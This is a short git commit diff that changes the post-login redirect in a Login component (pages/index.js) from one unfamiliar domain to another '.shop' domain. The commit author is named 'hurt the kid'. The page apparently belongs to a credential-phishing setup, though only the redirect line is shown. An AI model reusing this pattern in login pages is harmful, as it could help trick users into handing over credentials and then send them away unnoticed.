7e39efa172052fa271cf4b61ee4872622d0c937b
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-07-21 01:24:08 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://pitsuke.online/';
+      window.location.href = 'https://nerj.basschipper.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
